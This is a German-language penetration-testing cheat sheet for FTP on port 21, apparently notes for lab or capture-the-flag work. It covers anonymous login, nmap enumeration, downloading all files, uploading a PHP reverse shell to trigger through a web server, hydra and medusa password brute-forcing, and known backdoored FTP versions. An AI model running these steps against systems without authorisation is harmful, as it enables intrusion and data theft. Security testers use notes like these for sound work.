# 📂 FTP (21)

## Anonymous Login (immer testen!)

```bash
ftp $RHOST
# User: anonymous
# Password: anonymous (oder leer)

# Oder direkt:
ftp -n $RHOST <<EOF
user anonymous anonymous
ls
bye
EOF
```

## Enumeration

```bash
# Banner / Version
nc -nv $RHOST 21
nmap -sV -p21 $RHOST

# nmap NSE
nmap -p21 --script ftp-* $RHOST
nmap -p21 --script ftp-anon,ftp-bounce,ftp-syst $RHOST

# Vuln-Check (vsftpd 2.3.4 hat Backdoor!)
nmap -p21 --script ftp-vsftpd-backdoor $RHOST
```

## Innerhalb von FTP

```
ls -la
ls -R                # rekursiv
binary               # für Binärdateien (Bilder, Exe)
prompt off           # keine Bestätigung bei mget
mget *               # alles runterladen
recursive on         # rekursiv mget
```

## Wenn Upload erlaubt

```bash
# Reverse-Shell hochladen (wenn Webserver hinter dem FTP)
put shell.php
# → dann über Web-Pfad triggern
```

## Bruteforce (wenn nichts hilft)

```bash
hydra -L users.txt -P passwords.txt ftp://$RHOST -t 4
medusa -h $RHOST -U users.txt -P passwords.txt -M ftp
```

## Bekannte Vulns

| Software | CVE | Hinweis |
|---|---|---|
| vsftpd 2.3.4 | Backdoor | `:)` Smiley → Port 6200 |
| ProFTPD 1.3.5 | mod_copy RCE | |
| ProFTPD 1.3.3c | Backdoor | |
